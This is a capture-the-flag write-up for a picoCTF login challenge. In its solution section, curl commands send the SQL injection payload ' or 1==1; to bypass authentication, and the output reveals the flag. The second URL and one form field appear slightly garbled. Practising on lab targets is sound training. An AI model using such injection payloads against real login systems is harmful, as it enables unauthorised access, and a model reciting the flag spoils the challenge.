#### Description

There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!


### Hints

1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.


### Solucion
```
karymeZapmen-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username-admin&password=password&debug=1"
<pre>username: 
password: password
SQL query: SELECT * FROM users WHERE name='' AND password='password'
</pre><h1>Login failed.</h1>

karymeZapmen-picoctf@webshell:~$ curl -s https://jupiter.cm/33850/login.php -d "username-admin&password=' or 1==1;&debug=1" 
<pre>username: 
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='' AND password='' or 1==1;'
</pre><h1>Logged in!</h1><p>

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}</p>
```